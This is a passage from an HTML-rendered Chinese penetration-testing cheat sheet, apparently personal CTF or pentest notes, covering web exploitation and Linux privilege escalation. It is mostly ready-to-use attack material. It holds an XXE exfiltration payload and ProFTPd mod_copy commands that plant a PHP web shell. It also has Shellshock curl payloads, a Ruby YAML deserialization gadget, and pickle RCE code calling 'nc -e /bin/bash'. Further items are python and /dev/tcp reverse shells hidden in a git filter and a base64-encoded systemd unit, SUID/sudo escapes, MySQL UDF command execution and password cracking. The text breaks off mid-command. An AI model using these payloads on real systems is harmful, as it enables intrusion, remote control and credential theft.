&#39;http:&#x2F;&#x2F;10.10.*.*&#x2F;?BFL&#x3D;%file;&#39;&gt;&quot;&gt;</span><br><span class="line">%eval;</span><br><span class="line">%exfiltrate;</span><br></pre></td></tr></table></figure><h3 id="其他"><a class="markdownIt-Anchor" href="#其他"></a> 其他</h3><ul><li>git信息泄露 :<ul><li><code>/.git/HEAD</code></li><li><a href="https://github.com/internetwache/GitTools">https://github.com/internetwache/GitTools</a></li></ul></li><li>DS_Store文件泄露 : ds_store_exp</li><li>ProFTPd 1.3.5 mod_copy InfoLeak&amp;RCE</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.0.1 21</span><br><span class="line">site cpfr &#x2F;etc&#x2F;passwd</span><br><span class="line">site cpto &#x2F;var&#x2F;www&#x2F;html&#x2F;passwd</span><br><span class="line">~~~~~~</span><br><span class="line">nc 192.168.0.1 21</span><br><span class="line">site cpfr &#x2F;proc&#x2F;self&#x2F;cmdline</span><br><span class="line">site cpto &#x2F;var&#x2F;www&#x2F;html&#x2F;&lt;?php passthru($_GET[&#39;cmd&#39;]);?&gt;.php</span><br><span class="line">site cpfr &#x2F;var&#x2F;www&#x2F;html&#x2F;&lt;?php passthru($_GET[&#39;cmd&#39;]);?&gt;.php</span><br><span class="line">site cpto &#x2F;var&#x2F;www&#x2F;html&#x2F;shell.php</span><br></pre></td></tr></table></figure><ul><li><p>ShellShock</p><ul><li><code>env x='() &#123; :;&#125;; echo vulnerable' bash -c &quot;echo this is a test&quot;</code> (CVE-2014-6271)</li><li><code>env -i X=';() &#123; (a)=&gt;\' bash -c 'echo date'; cat echo</code> (CVE-2014-7169)</li><li>/cgi-bin/* 200</li><li><code>curl -H &quot;user-agent: () &#123; :; &#125;; echo; echo; /bin/bash -c 'cat /etc/passwd'&quot; http//192.168.0.1/cgi-bin/</code></li></ul></li><li><p>Ruby YAML.Load() Deserialization</p></li></ul><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">- !ruby/<span class="symbol">object:</span>Gem::Installer</span><br><span class="line"><span class="symbol">i:</span> x</span><br><span class="line">- !ruby/<span class="symbol">object:</span>Gem::SpecFetcher</span><br><span class="line"><span class="symbol">i:</span> y</span><br><span class="line">- !ruby/<span class="symbol">object:</span>Gem::Requirement</span><br><span class="line">  <span class="symbol">requirements:</span></span><br><span class="line">!ruby/<span class="symbol">object:</span>Gem::Package::TarReader</span><br><span class="line"><span class="symbol">io:</span> &amp;<span class="number">1</span> !ruby/<span class="symbol">object:</span>Net::BufferedIO</span><br><span class="line">  <span class="symbol">io:</span> &amp;<span class="number">1</span> !ruby/<span class="symbol">object:</span>Gem::Package::TarReader::Entry</span><br><span class="line"> <span class="symbol">read:</span> <span class="number">0</span></span><br><span class="line"> <span class="symbol">header:</span> <span class="string">&quot;abc&quot;</span></span><br><span class="line">  <span class="symbol">debug_output:</span> &amp;<span class="number">1</span> !ruby/<span class="symbol">object:</span>Net::WriteAdapter</span><br><span class="line"> <span class="symbol">socket:</span> &amp;<span class="number">1</span> !ruby/<span class="symbol">object:</span>Gem::RequestSet</span><br><span class="line"> <span class="symbol">sets:</span> !ruby/<span class="symbol">object:</span>Net::WriteAdapter</span><br><span class="line"> <span class="symbol">socket:</span> !ruby/<span class="class"><span class="keyword">module</span> &#x27;<span class="title">Kernel</span>&#x27;</span></span><br><span class="line"> <span class="symbol">method_id:</span> <span class="symbol">:system</span></span><br><span class="line"> <span class="symbol">git_set:</span> <span class="string">&quot;touch /tmp/hacked&quot;</span></span><br><span class="line"> <span class="symbol">method_id:</span> <span class="symbol">:resolve</span></span><br></pre></td></tr></table></figure><ul><li>java<ul><li>pom.xml</li></ul></li></ul><blockquote><p><a href="https://github.com/jeremylong/DependencyCheck">https://github.com/jeremylong/DependencyCheck</a></p></blockquote><ul><li>.NET JSON Deserialize</li></ul><blockquote><p><a href="https://www.cnblogs.com/nice0e3/p/15294585.html">https://www.cnblogs.com/nice0e3/p/15294585.html</a><br /><a href="https://systemweakness.com/exploiting-json-serialization-in-net-core-694c111faa15">https://systemweakness.com/exploiting-json-serialization-in-net-core-694c111faa15</a></p></blockquote><ul><li>FastCGI</li></ul><blockquote><p><a href="https://book.hacktricks.xyz/network-services-pentesting/9000-pentesting-fastcgi">https://book.hacktricks.xyz/network-services-pentesting/9000-pentesting-fastcgi</a></p></blockquote><ul><li>Prototype Pollution</li></ul><blockquote><p><a href="https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce#pp2rce-via-env-vars-+-cmdline">https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce#pp2rce-via-env-vars-+-cmdline</a></p></blockquote><h2 id="权限提升"><a class="markdownIt-Anchor" href="#权限提升"></a> 权限提升</h2><h3 id="cap特权"><a class="markdownIt-Anchor" href="#cap特权"></a> cap特权</h3><p><code>getcap -r / 2&gt; /dev/null</code></p><table><thead><tr><th>Capabilities</th><th style="text-align:left">Description</th></tr></thead><tbody><tr><td>CAP_AUDIT_CONTROL</td><td style="text-align:left">启用和禁用内核审计；改变审计过滤规则；检索审计状态和过滤规则</td></tr><tr><td>CAP_AUDIT_READ</td><td style="text-align:left">允许通过 multicast netlink 套接字读取审计日志</td></tr><tr><td>CAP_AUDIT_WRITE</td><td style="text-align:left">将记录写入内核审计日志</td></tr><tr><td>CAP_BLOCK_SUSPEND</td><td style="text-align:left">使用可以阻止系统挂起的特性</td></tr><tr><td>CAP_CHOWN</td><td style="text-align:left">修改文件所有者的权限</td></tr><tr><td>CAP_DAC_OVERRIDE</td><td style="text-align:left">忽略文件的 DAC 访问限制</td></tr><tr><td>CAP_DAC_READ_SEARCH</td><td style="text-align:left">忽略文件读及目录搜索的 DAC 访问限制</td></tr><tr><td>CAP_FOWNER</td><td style="text-align:left">忽略文件属主 ID 必须和进程用户 ID 相匹配的限制</td></tr><tr><td>CAP_FSETID</td><td style="text-align:left">允许设置文件的 setuid 位</td></tr><tr><td>CAP_IPC_LOCK</td><td style="text-align:left">允许锁定共享内存片段</td></tr><tr><td>CAP_IPC_OWNER</td><td style="text-align:left">忽略 IPC 所有权检查</td></tr><tr><td>CAP_KILL</td><td style="text-align:left">允许对不属于自己的进程发送信号</td></tr><tr><td>CAP_LEASE</td><td style="text-align:left">允许修改文件锁的 FL_LEASE 标志</td></tr><tr><td>CAP_LINUX_IMMUTABLE</td><td style="text-align:left">允许修改文件的 IMMUTABLE 和 APPEND 属性标志</td></tr><tr><td>CAP_MAC_ADMIN</td><td style="text-align:left">允许 MAC 配置或状态更改</td></tr><tr><td>CAP_MAC_OVERRIDE</td><td style="text-align:left">忽略文件的 DAC 访问限制</td></tr><tr><td>CAP_MKNOD</td><td style="text-align:left">允许使用 mknod() 系统调用</td></tr><tr><td>CAP_NET_ADMIN</td><td style="text-align:left">允许执行网络管理任务</td></tr><tr><td>CAP_NET_BIND_SERVICE</td><td style="text-align:left">允许绑定到小于 1024 的端口</td></tr><tr><td>CAP_NET_BROADCAST</td><td style="text-align:left">允许网络广播和多播访问</td></tr><tr><td>CAP_NET_RAW</td><td style="text-align:left">允许使用原始套接字</td></tr><tr><td>CAP_SETGID</td><td style="text-align:left">允许改变进程的 GID</td></tr><tr><td>CAP_SETFCAP</td><td style="text-align:left">允许为文件设置任意的 capabilities</td></tr><tr><td>CAP_SETPCAP</td><td style="text-align:left">参考 capabilities man page</td></tr><tr><td>CAP_SETUID</td><td style="text-align:left">允许改变进程的 UID</td></tr><tr><td>CAP_SYS_ADMIN</td><td style="text-align:left">允许执行系统管理任务，如加载或卸载文件系统、设置磁盘配额等</td></tr><tr><td>CAP_SYS_BOOT</td><td style="text-align:left">允许重新启动系统</td></tr><tr><td>CAP_SYS_CHROOT</td><td style="text-align:left">允许使用 chroot() 系统调用</td></tr><tr><td>CAP_SYS_MODULE</td><td style="text-align:left">允许插入和删除内核模块</td></tr><tr><td>CAP_SYS_NICE</td><td style="text-align:left">允许提升优先级及设置其他进程的优先级</td></tr><tr><td>CAP_SYS_PACCT</td><td style="text-align:left">允许执行进程的 BSD 式审计</td></tr><tr><td>CAP_SYS_PTRACE</td><td style="text-align:left">允许跟踪任何进程</td></tr><tr><td>CAP_SYS_RAWIO</td><td style="text-align:left">允许直接访问 /devport、/dev/mem、/dev/kmem 及原始块设备</td></tr><tr><td>CAP_SYS_RESOURCE</td><td style="text-align:left">忽略资源限制</td></tr><tr><td>CAP_SYS_TIME</td><td style="text-align:left">允许改变系统时钟</td></tr><tr><td>CAP_SYS_TTY_CONFIG</td><td style="text-align:left">允许配置 TTY 设备</td></tr><tr><td>CAP_SYSLOG</td><td style="text-align:left">允许使用 syslog() 系统调用</td></tr><tr><td>CAP_WAKE_ALARM</td><td style="text-align:left">允许触发一些能唤醒系统的东西(比如 CLOCK_BOOTTIME_ALARM 计时器)</td></tr></tbody></table><h3 id="流量监听"><a class="markdownIt-Anchor" href="#流量监听"></a> 流量监听</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -D</span><br><span class="line">timeout 120 tcpdump -i interface -w cap.pcap</span><br><span class="line">tcpdump -r cap.pcap</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">timeout 120 tshark -i interface</span><br></pre></td></tr></table></figure><h3 id="shell"><a class="markdownIt-Anchor" href="#shell"></a> Shell</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">python -c <span class="string">&#x27;import os; os.system(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">perl -e <span class="string">&#x27;exec &quot;/bin/bash&quot;;&#x27;</span></span><br><span class="line">awk <span class="string">&#x27;BEGIN &#123;system(&quot;/bin/bash&quot;)&#125;&#x27;</span></span><br></pre></td></tr></table></figure><ul><li>tty(输出至终端/需要注意tty的写入权限)</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tty</span><br><span class="line">&#x2F;dev&#x2F;pts&#x2F;0</span><br><span class="line">cat &#x2F;etc&#x2F;passwd &gt; &#x2F;dev&#x2F;pts&#x2F;0</span><br></pre></td></tr></table></figure><h3 id="密码"><a class="markdownIt-Anchor" href="#密码"></a> 密码</h3><ul><li>密码共用<ul><li>WEB账户</li><li>WEB admin</li><li>SSH</li><li>FTP</li><li>MySQL</li><li>root</li><li>Redis</li></ul></li><li><code>/etc/passwd</code> &amp; <code>/etc/shadow</code></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hashcat --<span class="built_in">help</span> | grep Unix</span><br><span class="line">hashcat -m 500 -a 0 -o found.txt crack.hash rockyou.txt</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;$1$flag$vqjCxzjtRc7PofLYS2lWf/&#x27;</span> &gt; passwd</span><br><span class="line">john --wordlist=/usr/share/wordlists/rockyou.txt --format=md5crypt-long passwd</span><br><span class="line">john --show passwd</span><br></pre></td></tr></table></figure><ul><li>unshadow</li><li>ssh</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/john/ssh2john.py id_rsa &gt; ssh</span><br><span class="line">john --wordlist=/usr/share/wordlists/rockyou.txt ssh</span><br></pre></td></tr></table></figure><ul><li>wordpress – $P$ – phpass</li></ul><table><thead><tr><th style="text-align:center">passwd/shadow</th><th style="text-align:center">Method</th><th style="text-align:center">hashcat -m</th><th style="text-align:center">john --format=</th></tr></thead><tbody><tr><td style="text-align:center">$1</td><td style="text-align:center">md5</td><td style="text-align:center">500</td><td style="text-align:center">md5crypt-long</td></tr><tr><td style="text-align:center">$2*</td><td style="text-align:center">bcrypt(Blow Fish)</td><td style="text-align:center">3200</td><td style="text-align:center">bcrypt</td></tr><tr><td style="text-align:center">$5</td><td style="text-align:center">sha256</td><td style="text-align:center">7400</td><td style="text-align:center">sha256crypt</td></tr><tr><td style="text-align:center">$6</td><td style="text-align:center">sha512</td><td style="text-align:center">1800</td><td style="text-align:center">sha512crypt</td></tr></tbody></table><h3 id="本地服务探测"><a class="markdownIt-Anchor" href="#本地服务探测"></a> 本地服务探测</h3><ul><li>netstat</li><li>ss</li><li>lsof</li></ul><h3 id="udf提权"><a class="markdownIt-Anchor" href="#udf提权"></a> UDF提权</h3><ul><li>插件路径: <code>show variables like 'plugin_dir';</code></li><li>文件权限: <code>SHOW VARIABLES LIKE &quot;secure_file_priv&quot;;</code><ul><li>mysqld.conf: “secure_file_priv=”</li><li>该值为空则无限制</li><li>该值为NULL则不可写入</li><li>该值为路径则可写入该路径（不包含子路径）</li></ul></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use mysql;</span><br><span class="line">create table foo(line blob);</span><br><span class="line">insert into foo values(load_file(&#39;&#x2F;tmp&#x2F;udf.so&#39;));</span><br><span class="line">select * from foo into dumpfile &#39;%plugin_dir%&#x2F;udf.so&#39;;</span><br><span class="line">create function sys_eval returns string soname &#39;udf.so&#39;;</span><br><span class="line">select sys_eval(&#39;id&#39;);</span><br></pre></td></tr></table></figure><h4 id="udf文件dllso"><a class="markdownIt-Anchor" href="#udf文件dllso"></a> UDF文件(dll/so)</h4><p><strong>Metasploit</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;data&#x2F;exploits&#x2F;mysql&#x2F;lib_mysqludf_sys_32.dll</span><br><span class="line">&#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;data&#x2F;exploits&#x2F;mysql&#x2F;lib_mysqludf_sys_32.so</span><br><span class="line">&#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;data&#x2F;exploits&#x2F;mysql&#x2F;lib_mysqludf_sys_64.dll</span><br><span class="line">&#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;data&#x2F;exploits&#x2F;mysql&#x2F;lib_mysqludf_sys_64.so</span><br></pre></td></tr></table></figure><p>可以使用IDA来查看具体有哪些函数</p><ul><li>sys_get</li><li>sys_exec</li><li>sys_eval</li><li>sys_set</li><li>sys_bineval</li></ul><p><strong>SQLMap</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;usr&#x2F;share&#x2F;sqlmap&#x2F;data&#x2F;udf&#x2F;mysql&#x2F;linux&#x2F;32&#x2F;lib_mysqludf_sys.so_</span><br><span class="line">&#x2F;usr&#x2F;share&#x2F;sqlmap&#x2F;data&#x2F;udf&#x2F;mysql&#x2F;linux&#x2F;64&#x2F;lib_mysqludf_sys.so_</span><br><span class="line">&#x2F;usr&#x2F;share&#x2F;sqlmap&#x2F;data&#x2F;udf&#x2F;mysql&#x2F;windows&#x2F;32&#x2F;lib_mysqludf_sys.dll_</span><br><span class="line">&#x2F;usr&#x2F;share&#x2F;sqlmap&#x2F;data&#x2F;udf&#x2F;mysql&#x2F;windows&#x2F;64&#x2F;lib_mysqludf_sys.dll_</span><br></pre></td></tr></table></figure><p><strong>Decode</strong><br /><code>python .\cloak.py -d -i ..\..\udf\mysql\linux\64\lib_mysqludf_sys.so_ -o linux_udf_64.so</code></p><h4 id="mysql执行系统命令"><a class="markdownIt-Anchor" href="#mysql执行系统命令"></a> Mysql执行系统命令</h4><ul><li>system whoami<br />(version &gt;= 5.7)</li></ul><h3 id="sudo-suid"><a class="markdownIt-Anchor" href="#sudo-suid"></a> SUDO &amp; SUID</h3><blockquote><p><a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></p></blockquote><p>使用Shell脚本进行提权，参数带有空格时需要用引号</p><p>SUID: <code>find / -user root -perm -4000 -print 2&gt;/dev/null</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo su</span><br><span class="line">sudo -i</span><br><span class="line">cat &#x2F;etc&#x2F;sudoers</span><br></pre></td></tr></table></figure><p>查看可以以sudo模式运行的程序<br /><code>sudo -l</code></p><ul><li><p>当sudo权限的命令受到执行路径的限制时，可以使用<code>../</code>来进行bypass</p></li><li><p>doas</p></li><li><p>python: <code>python -c 'import os;os.system(&quot;/bin/bash&quot;)'</code></p><ul><li>input(): <code>__import__('os').system('/bin/sh')</code></li><li>lib文件写入命令</li><li>pickle unserialize</li></ul></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line">import base64</span><br><span class="line">import os</span><br><span class="line">class RCE(object):</span><br><span class="line">def __reduce__(self):</span><br><span class="line">cmd &#x3D; (&#39;nc -e &#x2F;bin&#x2F;bash 192.168.0.1 8080&#39;)</span><br><span class="line">return os.system, (cmd,)</span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">print(base64.urlsafe_b64encode(pickle.dumps(RCE())))</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line">import urllib</span><br><span class="line">class payload(object):</span><br><span class="line">def __reduce__(self):</span><br><span class="line">return (eval,(&quot;(open(&#39;&#x2F;flag,txt&#39;),&#39;r).read()&quot;,))</span><br><span class="line"></span><br><span class="line">print(urllib.quote((pickle.dumps(payload()))))</span><br></pre></td></tr></table></figure><ul><li>php: <code>php -r &quot;system('/bin/bash');&quot;</code></li><li>rpm: <code>rpm --eval '%&#123;lua:posix.exec(&quot;/bin/bash&quot;)&#125;'</code></li><li>dpkg</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gem install fpm</span><br><span class="line">mkdir exp &amp;&amp; cd exp</span><br><span class="line">echo -e &#39;#!&#x2F;bin&#x2F;bash\n&#x2F;bin&#x2F;bash&#39; &gt; exp.sh</span><br><span class="line">fpm -s dir -t deb -n exp --before-install exp.sh .&#x2F;</span><br><span class="line">dpkg -i exp_1.0_amd64.deb</span><br></pre></td></tr></table></figure><ul><li>ruby: <code>ruby -e 'exec &quot;/bin/bash&quot;'</code></li><li>gcc: <code>gcc -wrapper /bin/bash,-s .</code></li><li>perl: <code>perl -e 'exec &quot;/bin/bash&quot;;'</code></li><li>java:</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">sudo</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">ProcessBuilder processBuilder = <span class="keyword">new</span> ProcessBuilder();</span><br><span class="line">processBuilder.command(<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;whoami &gt; whoami&quot;</span>);</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">Process process = processBuilder.start();</span><br><span class="line">BufferedReader reader =</span><br><span class="line"><span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(process.getInputStream()));</span><br><span class="line">String line;</span><br><span class="line"><span class="keyword">while</span> ((line = reader.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">System.out.println(line);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> exitCode = process.waitFor();</span><br><span class="line">System.out.println(<span class="string">&quot;\nExited with error code : &quot;</span> + exitCode);</span><br><span class="line">&#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javac sudo.java</span><br><span class="line">java sudo</span><br></pre></td></tr></table></figure><ul><li>mysql: <code>mysql -e '\! /bin/bash'</code></li><li>nmap<ul><li>2.02 &lt;= nmap -v &lt;=5.21</li></ul></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap --interactive</span><br><span class="line">!sh</span><br></pre></td></tr></table></figure><ul><li>vim<ul><li>浏览<code>/etc/shadow</code></li><li>shell</li></ul></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vim</span><br><span class="line">:set shell&#x3D;&#x2F;bin&#x2F;bash</span><br><span class="line">:shell</span><br></pre></td></tr></table></figure><ul><li>less</li><li>more</li><li>nano</li><li>cp<ul><li>覆盖passwd（垂直）</li><li>写入authorized_keys（水平）</li><li>–no-preserve=mode</li></ul></li><li>mv</li><li>wget</li><li>find<ul><li><code>find . -exec whoami \;</code></li><li><code>find . -exec /bin/bash -p\;</code></li></ul></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">读取：***</span><br><span class="line">写入：**2</span><br><span class="line">执行：**4(bash); 1**, *1*, **1(exec)</span><br></pre></td></tr></table></figure><ul><li>bash</li><li>bash -p</li><li>awk<ul><li><code>awk '/RE/&#123;system(&quot;cat /tmp/1&quot;)&#125;' /etc/passwd &gt;&gt; /etc/passwd</code></li><li><code>/tmp/1</code> 是写好的账户信息</li><li>RE用于匹配passwd中某单独一行的结尾部分</li></ul></li><li>tee: <code>echo 1 | tee /etc/passwd</code></li><li>unzip</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;passwd &gt; passwd</span><br><span class="line">echo data &gt;&gt; passwd</span><br><span class="line">zip new.zip passwd</span><br><span class="line">unzip new.zip -d &#x2F;etc&#x2F;</span><br></pre></td></tr></table></figure><ul><li>git filter<br />Git提供了一种过滤机制，允许用户在文件检出或提交到Git存储库时将自定义脚本应用于文件。<br />过滤机制由两种类型的过滤器组成：clean过滤器和smudge过滤器。clean过滤器用于在将文件提交到Git存储库之前转换文件的内容。smudge过滤器用于在从Git存储库检出文件时转换文件的内容。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;python3 -c \&quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#x27;0.0.0.0&#x27;,9995));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#x27;/bin/bash&#x27;,&#x27;-i&#x27;]);\&quot;&quot;</span> &gt; /tmp/BFL</span><br><span class="line">chmod +x /tmp/BFL</span><br><span class="line">git init</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;*.php filter=indent&#x27;</span> &gt; /var/www/image/.git/info/attributes</span><br><span class="line">git config filter.indent.clean /tmp/BFL</span><br><span class="line">sudo -u svc /var/www/image/scripts/git-commit.sh</span><br></pre></td></tr></table></figure><ul><li>systemctl</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[Service]</span><br><span class="line">ExecStart&#x3D;&#x2F;bin&#x2F;bash -c &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.10.*.*&#x2F;9996 0&gt;&amp;1&quot;</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy&#x3D;multi-user.target</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo -n W1NlcnZpY2VdCkV4ZWNTdGFydD0vYmluL2Jhc2ggLWMgImJhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuMi85OTk2IDA+JjEiCgpbSW5zdGFsbF0KV2FudGVkQnk9bXVsdGktdXNlci50YXJnZXQ&#x3D; | base64 -d &gt; &#x2F;etc&#x2F;systemd&#x2F;system&#x2F;bufferfly.service</span><br></pre></td></tr></table></figure><h4 id="path"><a class="markdownIt-Anchor" href="#path"></a> $PATH</h4><ul><li>目标文件为二进制可执行文件</li><li>需要知道目标文件所执行的命令</li><li>strings查看可执行文件内容</li></ul><p><strong>echo</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;tmp</span><br><span class="line">echo &quot;&#x2F;bin&#x2F;bash&quot; &gt; ps</span><br><span class="line">chmod 777 ps</span><br><span class="line">echo $PATH</span><br><span class="line">export PATH&#x3D;&#x2F;tmp:$PATH</span><br><span class="line">cd &#x2F;usr&#x2F;bin</span><br><span class="line">.&#x2F;shell</span><br><span class="line">whoami</span><br></pre></td></tr></table></figure><p><strong>copy</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;tmp</span><br><span class="line">cp &#x2F;bin&#x2F;bash &#x2F;tmp&#x2F;ps</span><br><span class="line">chmod 777 ps</span><br><span class="line">echo $PATH</span><br><span class="line">export PATH&#x3D;&#x2F;tmp:$PATH</span><br><span class="line">cd &#x2F;usr&#x2F;bin</span><br><span class="line">.&#x2F;shell</span><br><span class="line">whoami</span><br></pre></td></tr></table></figure><p><strong>symlink</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;tmp</span><br><span class="line">ln -s &#x2F;bin&#x2F;bash ps</span><br><span class="line">chmod 777 ps</span><br><span class="line">echo $PATH</span><br><span class="line">export 